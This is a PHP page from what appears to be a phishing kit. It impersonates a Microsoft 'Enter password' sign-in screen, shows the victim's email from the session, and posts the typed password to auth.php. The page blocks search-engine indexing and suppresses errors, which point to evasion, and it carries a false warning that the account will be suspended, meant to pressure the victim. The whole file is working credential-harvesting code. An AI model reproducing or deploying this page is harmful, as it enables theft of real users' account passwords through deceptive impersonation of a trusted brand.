<?php
include 'helper.php';
include 'Scan.php';
session_start();
error_reporting(0);
@set_time_limit(0);

if(!isset($_SESSION['email'])){
	header('Location: index.php');
	exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Sign in</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="robots" content="none" />
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="img/favicon_a.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100 p-l-40 p-r-40 p-t-50 p-b-50">
				<form class="login100-form validate-form" method="post" action="auth.php">
					<span class="login100-form-title p-b-2">
						<img src="img/microsoft_logo.png" alt="logo">
					</span>
                    
					<div class="txt1 text-center p-b-10 p-t-10">
                        <a href="index.php"><img src="img/arrow_left.svg" alt="arrow" style="float: left;"></a>
					   <?php echo $_SESSION['email']; ?>
                    </div>
                    
                    <div class="p-b-5">
                        <h4>Enter password</h4>
					</div>
                    
                     <?php if(isset($_SESSION['error'])) { ?><div class="error-validate p-b-5">Your account or password is incorrect. Your account will be suspended if you sign in too many times with an incorrect password.</div><?php } ?>

					<div class="wrap-input100 rs1 validate-input" data-validate="Please enter your password.">
						<input class="input100" type="password" name="passwd" placeholder="Password">
						<span class="focus-input100-1"></span>
						<span class="focus-input100-2"></span>
					</div>

					<div class="container-login100-form-btn m-t-20">
						<button class="login100-form-btn">
							Sign In
						</button>
					</div>

					<div class="text-center p-t-20 p-b-4">

						<a href="#" class="txt2 hov1">
							Forgot my password
						</a>
					</div>
				</form>
			</div>
		</div>
	</div>
	

	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>